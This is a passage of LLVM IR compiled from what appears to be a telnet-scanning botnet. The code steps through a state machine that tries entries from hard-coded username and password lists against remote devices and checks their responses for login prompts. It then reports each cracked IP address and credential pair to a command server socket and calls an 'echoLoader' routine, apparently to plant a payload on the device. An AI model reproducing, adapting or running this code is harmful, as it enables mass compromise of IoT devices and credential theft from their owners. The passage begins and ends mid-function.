; <label>:1655:                                   ; preds = %1589
  %1656 = load i32, i32* %2, align 4
  %1657 = sext i32 %1656 to i64
  %1658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1657
  %1659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1658, i32 0, i32 0
  %1660 = load i32, i32* %1659, align 16
  %1661 = load i32, i32* %2, align 4
  %1662 = sext i32 %1661 to i64
  %1663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1662
  %1664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1663, i32 0, i32 8
  %1665 = load i8*, i8** %1664, align 8
  %1666 = load i32, i32* %2, align 4
  %1667 = sext i32 %1666 to i64
  %1668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1667
  %1669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1668, i32 0, i32 7
  %1670 = load i16, i16* %1669, align 16
  %1671 = zext i16 %1670 to i32
  %1672 = call i32 @readUntil(i32 %1660, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1665, i32 1024, i32 %1671)
  %1673 = icmp ne i32 %1672, 0
  br i1 %1673, label %1674, label %1721

; <label>:1674:                                   ; preds = %1655
  %1675 = load i32, i32* %2, align 4
  %1676 = sext i32 %1675 to i64
  %1677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1676
  %1678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1677, i32 0, i32 6
  store i32 0, i32* %1678, align 4
  %1679 = load i32, i32* %2, align 4
  %1680 = sext i32 %1679 to i64
  %1681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1680
  %1682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1681, i32 0, i32 7
  store i16 0, i16* %1682, align 16
  %1683 = load i32, i32* %2, align 4
  %1684 = sext i32 %1683 to i64
  %1685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1684
  %1686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1685, i32 0, i32 8
  %1687 = load i8*, i8** %1686, align 8
  %1688 = call i8* @strstr(i8* %1687, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1689 = icmp ne i8* %1688, null
  br i1 %1689, label %1690, label %1710

; <label>:1690:                                   ; preds = %1674
  %1691 = load i32, i32* %2, align 4
  %1692 = sext i32 %1691 to i64
  %1693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1692
  %1694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1693, i32 0, i32 8
  %1695 = load i8*, i8** %1694, align 8
  call void @llvm.memset.p0i8.i64(i8* %1695, i8 0, i64 1024, i32 1, i1 false)
  %1696 = load i32, i32* %2, align 4
  %1697 = sext i32 %1696 to i64
  %1698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1697
  %1699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1698, i32 0, i32 0
  %1700 = load i32, i32* %1699, align 16
  %1701 = call i32 @sclose(i32 %1700)
  %1702 = load i32, i32* %2, align 4
  %1703 = sext i32 %1702 to i64
  %1704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1703
  %1705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1704, i32 0, i32 2
  store i8 0, i8* %1705, align 8
  %1706 = load i32, i32* %2, align 4
  %1707 = sext i32 %1706 to i64
  %1708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1707
  %1709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1708, i32 0, i32 3
  store i8 0, i8* %1709, align 1
  br label %2366

; <label>:1710:                                   ; preds = %1674
  %1711 = load i32, i32* %2, align 4
  %1712 = sext i32 %1711 to i64
  %1713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1712
  %1714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1713, i32 0, i32 2
  store i8 7, i8* %1714, align 8
  br label %1715

; <label>:1715:                                   ; preds = %1710
  %1716 = load i32, i32* %2, align 4
  %1717 = sext i32 %1716 to i64
  %1718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1717
  %1719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1718, i32 0, i32 8
  %1720 = load i8*, i8** %1719, align 8
  call void @llvm.memset.p0i8.i64(i8* %1720, i8 0, i64 1024, i32 1, i1 false)
  br label %2366

; <label>:1721:                                   ; preds = %1655
  %1722 = load i32, i32* %2, align 4
  %1723 = sext i32 %1722 to i64
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1723
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1724, i32 0, i32 0
  %1726 = load i32, i32* %1725, align 16
  %1727 = load i32, i32* %2, align 4
  %1728 = sext i32 %1727 to i64
  %1729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1728
  %1730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1729, i32 0, i32 8
  %1731 = load i8*, i8** %1730, align 8
  %1732 = load i32, i32* %2, align 4
  %1733 = sext i32 %1732 to i64
  %1734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1733
  %1735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1734, i32 0, i32 7
  %1736 = load i16, i16* %1735, align 16
  %1737 = zext i16 %1736 to i32
  %1738 = call i32 @readUntil(i32 %1726, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1731, i32 1024, i32 %1737)
  %1739 = icmp ne i32 %1738, 0
  br i1 %1739, label %1740, label %1787

; <label>:1740:                                   ; preds = %1721
  %1741 = load i32, i32* %2, align 4
  %1742 = sext i32 %1741 to i64
  %1743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1742
  %1744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1743, i32 0, i32 6
  store i32 0, i32* %1744, align 4
  %1745 = load i32, i32* %2, align 4
  %1746 = sext i32 %1745 to i64
  %1747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1746
  %1748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1747, i32 0, i32 7
  store i16 0, i16* %1748, align 16
  %1749 = load i32, i32* %2, align 4
  %1750 = sext i32 %1749 to i64
  %1751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1750
  %1752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1751, i32 0, i32 8
  %1753 = load i8*, i8** %1752, align 8
  %1754 = call i8* @strstr(i8* %1753, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1755 = icmp ne i8* %1754, null
  br i1 %1755, label %1756, label %1776

; <label>:1756:                                   ; preds = %1740
  %1757 = load i32, i32* %2, align 4
  %1758 = sext i32 %1757 to i64
  %1759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1758
  %1760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1759, i32 0, i32 8
  %1761 = load i8*, i8** %1760, align 8
  call void @llvm.memset.p0i8.i64(i8* %1761, i8 0, i64 1024, i32 1, i1 false)
  %1762 = load i32, i32* %2, align 4
  %1763 = sext i32 %1762 to i64
  %1764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1763
  %1765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1764, i32 0, i32 0
  %1766 = load i32, i32* %1765, align 16
  %1767 = call i32 @sclose(i32 %1766)
  %1768 = load i32, i32* %2, align 4
  %1769 = sext i32 %1768 to i64
  %1770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1769
  %1771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1770, i32 0, i32 2
  store i8 0, i8* %1771, align 8
  %1772 = load i32, i32* %2, align 4
  %1773 = sext i32 %1772 to i64
  %1774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1773
  %1775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1774, i32 0, i32 3
  store i8 0, i8* %1775, align 1
  br label %2366

; <label>:1776:                                   ; preds = %1740
  %1777 = load i32, i32* %2, align 4
  %1778 = sext i32 %1777 to i64
  %1779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1778
  %1780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1779, i32 0, i32 2
  store i8 7, i8* %1780, align 8
  br label %1781

; <label>:1781:                                   ; preds = %1776
  %1782 = load i32, i32* %2, align 4
  %1783 = sext i32 %1782 to i64
  %1784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1783
  %1785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1784, i32 0, i32 8
  %1786 = load i8*, i8** %1785, align 8
  call void @llvm.memset.p0i8.i64(i8* %1786, i8 0, i64 1024, i32 1, i1 false)
  br label %2366

; <label>:1787:                                   ; preds = %1721
  %1788 = load i32, i32* %2, align 4
  %1789 = sext i32 %1788 to i64
  %1790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1789
  %1791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1790, i32 0, i32 0
  %1792 = load i32, i32* %1791, align 16
  %1793 = load i32, i32* %2, align 4
  %1794 = sext i32 %1793 to i64
  %1795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1794
  %1796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1795, i32 0, i32 8
  %1797 = load i8*, i8** %1796, align 8
  %1798 = load i32, i32* %2, align 4
  %1799 = sext i32 %1798 to i64
  %1800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1799
  %1801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1800, i32 0, i32 7
  %1802 = load i16, i16* %1801, align 16
  %1803 = zext i16 %1802 to i32
  %1804 = call i32 @readUntil(i32 %1792, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1797, i32 1024, i32 %1803)
  %1805 = icmp ne i32 %1804, 0
  br i1 %1805, label %1806, label %1853

; <label>:1806:                                   ; preds = %1787
  %1807 = load i32, i32* %2, align 4
  %1808 = sext i32 %1807 to i64
  %1809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1808
  %1810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1809, i32 0, i32 6
  store i32 0, i32* %1810, align 4
  %1811 = load i32, i32* %2, align 4
  %1812 = sext i32 %1811 to i64
  %1813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1812
  %1814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1813, i32 0, i32 7
  store i16 0, i16* %1814, align 16
  %1815 = load i32, i32* %2, align 4
  %1816 = sext i32 %1815 to i64
  %1817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1816
  %1818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1817, i32 0, i32 8
  %1819 = load i8*, i8** %1818, align 8
  %1820 = call i8* @strstr(i8* %1819, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1821 = icmp ne i8* %1820, null
  br i1 %1821, label %1822, label %1842

; <label>:1822:                                   ; preds = %1806
  %1823 = load i32, i32* %2, align 4
  %1824 = sext i32 %1823 to i64
  %1825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1824
  %1826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1825, i32 0, i32 8
  %1827 = load i8*, i8** %1826, align 8
  call void @llvm.memset.p0i8.i64(i8* %1827, i8 0, i64 1024, i32 1, i1 false)
  %1828 = load i32, i32* %2, align 4
  %1829 = sext i32 %1828 to i64
  %1830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1829
  %1831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1830, i32 0, i32 0
  %1832 = load i32, i32* %1831, align 16
  %1833 = call i32 @sclose(i32 %1832)
  %1834 = load i32, i32* %2, align 4
  %1835 = sext i32 %1834 to i64
  %1836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1835
  %1837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1836, i32 0, i32 2
  store i8 0, i8* %1837, align 8
  %1838 = load i32, i32* %2, align 4
  %1839 = sext i32 %1838 to i64
  %1840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1839
  %1841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1840, i32 0, i32 3
  store i8 0, i8* %1841, align 1
  br label %2366

; <label>:1842:                                   ; preds = %1806
  %1843 = load i32, i32* %2, align 4
  %1844 = sext i32 %1843 to i64
  %1845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1844
  %1846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1845, i32 0, i32 2
  store i8 7, i8* %1846, align 8
  br label %1847

; <label>:1847:                                   ; preds = %1842
  %1848 = load i32, i32* %2, align 4
  %1849 = sext i32 %1848 to i64
  %1850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1849
  %1851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1850, i32 0, i32 8
  %1852 = load i8*, i8** %1851, align 8
  call void @llvm.memset.p0i8.i64(i8* %1852, i8 0, i64 1024, i32 1, i1 false)
  br label %2366

; <label>:1853:                                   ; preds = %1787
  %1854 = load i32, i32* %2, align 4
  %1855 = sext i32 %1854 to i64
  %1856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1855
  %1857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1856, i32 0, i32 0
  %1858 = load i32, i32* %1857, align 16
  %1859 = load i32, i32* %2, align 4
  %1860 = sext i32 %1859 to i64
  %1861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1860
  %1862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1861, i32 0, i32 8
  %1863 = load i8*, i8** %1862, align 8
  %1864 = load i32, i32* %2, align 4
  %1865 = sext i32 %1864 to i64
  %1866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1865
  %1867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1866, i32 0, i32 7
  %1868 = load i16, i16* %1867, align 16
  %1869 = zext i16 %1868 to i32
  %1870 = call i32 @readUntil(i32 %1858, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1863, i32 1024, i32 %1869)
  %1871 = icmp ne i32 %1870, 0
  br i1 %1871, label %1872, label %1919

; <label>:1872:                                   ; preds = %1853
  %1873 = load i32, i32* %2, align 4
  %1874 = sext i32 %1873 to i64
  %1875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1874
  %1876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1875, i32 0, i32 6
  store i32 0, i32* %1876, align 4
  %1877 = load i32, i32* %2, align 4
  %1878 = sext i32 %1877 to i64
  %1879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1878
  %1880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1879, i32 0, i32 7
  store i16 0, i16* %1880, align 16
  %1881 = load i32, i32* %2, align 4
  %1882 = sext i32 %1881 to i64
  %1883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1882
  %1884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1883, i32 0, i32 8
  %1885 = load i8*, i8** %1884, align 8
  %1886 = call i8* @strstr(i8* %1885, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1887 = icmp ne i8* %1886, null
  br i1 %1887, label %1888, label %1908

; <label>:1888:                                   ; preds = %1872
  %1889 = load i32, i32* %2, align 4
  %1890 = sext i32 %1889 to i64
  %1891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1890
  %1892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1891, i32 0, i32 8
  %1893 = load i8*, i8** %1892, align 8
  call void @llvm.memset.p0i8.i64(i8* %1893, i8 0, i64 1024, i32 1, i1 false)
  %1894 = load i32, i32* %2, align 4
  %1895 = sext i32 %1894 to i64
  %1896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1895
  %1897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1896, i32 0, i32 0
  %1898 = load i32, i32* %1897, align 16
  %1899 = call i32 @sclose(i32 %1898)
  %1900 = load i32, i32* %2, align 4
  %1901 = sext i32 %1900 to i64
  %1902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1901
  %1903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1902, i32 0, i32 2
  store i8 0, i8* %1903, align 8
  %1904 = load i32, i32* %2, align 4
  %1905 = sext i32 %1904 to i64
  %1906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1905
  %1907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1906, i32 0, i32 3
  store i8 0, i8* %1907, align 1
  br label %2366

; <label>:1908:                                   ; preds = %1872
  %1909 = load i32, i32* %2, align 4
  %1910 = sext i32 %1909 to i64
  %1911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1910
  %1912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1911, i32 0, i32 2
  store i8 7, i8* %1912, align 8
  br label %1913

; <label>:1913:                                   ; preds = %1908
  %1914 = load i32, i32* %2, align 4
  %1915 = sext i32 %1914 to i64
  %1916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1915
  %1917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1916, i32 0, i32 8
  %1918 = load i8*, i8** %1917, align 8
  call void @llvm.memset.p0i8.i64(i8* %1918, i8 0, i64 1024, i32 1, i1 false)
  br label %2366

; <label>:1919:                                   ; preds = %1853
  %1920 = load i32, i32* %2, align 4
  %1921 = sext i32 %1920 to i64
  %1922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1921
  %1923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1922, i32 0, i32 8
  %1924 = load i8*, i8** %1923, align 8
  %1925 = call i64 @strlen(i8* %1924) #10
  %1926 = trunc i64 %1925 to i16
  %1927 = load i32, i32* %2, align 4
  %1928 = sext i32 %1927 to i64
  %1929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1928
  %1930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1929, i32 0, i32 7
  store i16 %1926, i16* %1930, align 16
  br label %1931

; <label>:1931:                                   ; preds = %1919
  %1932 = load i32, i32* %2, align 4
  %1933 = sext i32 %1932 to i64
  %1934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1933
  %1935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1934, i32 0, i32 6
  %1936 = load i32, i32* %1935, align 4
  %1937 = add i32 %1936, 296458891
  %1938 = add i32 %1937, 10
  %1939 = sub i32 %1938, 296458891
  %1940 = add i32 %1936, 10
  %1941 = zext i32 %1939 to i64
  %1942 = call i64 @time(i64* null) #2
  %1943 = icmp slt i64 %1941, %1942
  br i1 %1943, label %1944, label %1959

; <label>:1944:                                   ; preds = %1931
  %1945 = load i32, i32* %2, align 4
  %1946 = sext i32 %1945 to i64
  %1947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1946
  %1948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1947, i32 0, i32 0
  %1949 = load i32, i32* %1948, align 16
  %1950 = call i32 @sclose(i32 %1949)
  %1951 = load i32, i32* %2, align 4
  %1952 = sext i32 %1951 to i64
  %1953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1952
  %1954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1953, i32 0, i32 2
  store i8 0, i8* %1954, align 8
  %1955 = load i32, i32* %2, align 4
  %1956 = sext i32 %1955 to i64
  %1957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1956
  %1958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1957, i32 0, i32 3
  store i8 1, i8* %1958, align 1
  br label %1959

; <label>:1959:                                   ; preds = %1944, %1931
  br label %2365

; <label>:1960:                                   ; preds = %73
  %1961 = load i32, i32* %2, align 4
  %1962 = sext i32 %1961 to i64
  %1963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1962
  %1964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1963, i32 0, i32 0
  %1965 = load i32, i32* %1964, align 16
  %1966 = call i64 @send(i32 %1965, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0), i64 4, i32 16384)
  %1967 = icmp slt i64 %1966, 0
  br i1 %1967, label %1968, label %1983

; <label>:1968:                                   ; preds = %1960
  %1969 = load i32, i32* %2, align 4
  %1970 = sext i32 %1969 to i64
  %1971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1970
  %1972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1971, i32 0, i32 0
  %1973 = load i32, i32* %1972, align 16
  %1974 = call i32 @sclose(i32 %1973)
  %1975 = load i32, i32* %2, align 4
  %1976 = sext i32 %1975 to i64
  %1977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1976
  %1978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1977, i32 0, i32 2
  store i8 0, i8* %1978, align 8
  %1979 = load i32, i32* %2, align 4
  %1980 = sext i32 %1979 to i64
  %1981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1980
  %1982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1981, i32 0, i32 3
  store i8 1, i8* %1982, align 1
  br label %2366

; <label>:1983:                                   ; preds = %1960
  %1984 = load i32, i32* %2, align 4
  %1985 = sext i32 %1984 to i64
  %1986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1985
  %1987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1986, i32 0, i32 2
  store i8 8, i8* %1987, align 8
  br label %2365

; <label>:1988:                                   ; preds = %73
  %1989 = load i32, i32* %2, align 4
  %1990 = sext i32 %1989 to i64
  %1991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1990
  %1992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1991, i32 0, i32 0
  %1993 = load i32, i32* %1992, align 16
  %1994 = call i64 @send(i32 %1993, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i32 0, i32 0), i64 7, i32 16384)
  %1995 = icmp slt i64 %1994, 0
  br i1 %1995, label %1996, label %2011

; <label>:1996:                                   ; preds = %1988
  %1997 = load i32, i32* %2, align 4
  %1998 = sext i32 %1997 to i64
  %1999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1998
  %2000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1999, i32 0, i32 0
  %2001 = load i32, i32* %2000, align 16
  %2002 = call i32 @sclose(i32 %2001)
  %2003 = load i32, i32* %2, align 4
  %2004 = sext i32 %2003 to i64
  %2005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2004
  %2006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2005, i32 0, i32 2
  store i8 0, i8* %2006, align 8
  %2007 = load i32, i32* %2, align 4
  %2008 = sext i32 %2007 to i64
  %2009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2008
  %2010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2009, i32 0, i32 3
  store i8 1, i8* %2010, align 1
  br label %2366

; <label>:2011:                                   ; preds = %1988
  %2012 = load i32, i32* %2, align 4
  %2013 = sext i32 %2012 to i64
  %2014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2013
  %2015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2014, i32 0, i32 2
  store i8 9, i8* %2015, align 8
  br label %2365

; <label>:2016:                                   ; preds = %73
  %2017 = load i32, i32* %2, align 4
  %2018 = sext i32 %2017 to i64
  %2019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2018
  %2020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2019, i32 0, i32 0
  %2021 = load i32, i32* %2020, align 16
  %2022 = call i64 @send(i32 %2021, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2023 = icmp slt i64 %2022, 0
  br i1 %2023, label %2024, label %2039

; <label>:2024:                                   ; preds = %2016
  %2025 = load i32, i32* %2, align 4
  %2026 = sext i32 %2025 to i64
  %2027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2026
  %2028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2027, i32 0, i32 0
  %2029 = load i32, i32* %2028, align 16
  %2030 = call i32 @sclose(i32 %2029)
  %2031 = load i32, i32* %2, align 4
  %2032 = sext i32 %2031 to i64
  %2033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2032
  %2034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2033, i32 0, i32 2
  store i8 0, i8* %2034, align 8
  %2035 = load i32, i32* %2, align 4
  %2036 = sext i32 %2035 to i64
  %2037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2036
  %2038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2037, i32 0, i32 3
  store i8 1, i8* %2038, align 1
  br label %2366

; <label>:2039:                                   ; preds = %2016
  %2040 = load i32, i32* @mainCommSock, align 4
  %2041 = load i32, i32* %2, align 4
  %2042 = sext i32 %2041 to i64
  %2043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2042
  %2044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2043, i32 0, i32 1
  %2045 = bitcast i32* %2044 to %struct.in_addr*
  %2046 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2045, i32 0, i32 0
  %2047 = load i32, i32* %2046, align 4
  %2048 = call i8* @inet_ntoa(i32 %2047) #2
  %2049 = load i32, i32* %2, align 4
  %2050 = sext i32 %2049 to i64
  %2051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2050
  %2052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2051, i32 0, i32 4
  %2053 = load i8, i8* %2052, align 2
  %2054 = zext i8 %2053 to i64
  %2055 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2054
  %2056 = load i8*, i8** %2055, align 8
  %2057 = load i32, i32* %2, align 4
  %2058 = sext i32 %2057 to i64
  %2059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2058
  %2060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2059, i32 0, i32 5
  %2061 = load i8, i8* %2060, align 1
  %2062 = zext i8 %2061 to i64
  %2063 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2062
  %2064 = load i8*, i8** %2063, align 8
  %2065 = call i32 (i32, i8*, ...) @sockprintf(i32 %2040, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2048, i8* %2056, i8* %2064)
  %2066 = load i32, i32* %2, align 4
  %2067 = sext i32 %2066 to i64
  %2068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2067
  %2069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2068, i32 0, i32 2
  store i8 10, i8* %2069, align 8
  br label %2365

; <label>:2070:                                   ; preds = %73
  call void @echoLoader()
  %2071 = load i32, i32* %2, align 4
  %2072 = sext i32 %2071 to i64
  %2073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2072
  %2074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2073, i32 0, i32 0
  %2075 = load i32, i32* %2074, align 16
  %2076 = call i64 @send(i32 %2075, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.75, i32 0, i32 0), i64 61, i32 16384)
  %2077 = load i32, i32* %2, align 4
  %2078 = sext i32 %2077 to i64
  %2079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2078
  %2080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2079, i32 0, i32 2
  store i8 11, i8* %2080, align 8
  br label %2365

; <label>:2081:                                   ; preds = %73
  %2082 = load i32, i32* %2, align 4
  %2083 = sext i32 %2082 to i64
  %2084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2083
  %2085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2084, i32 0, i32 0
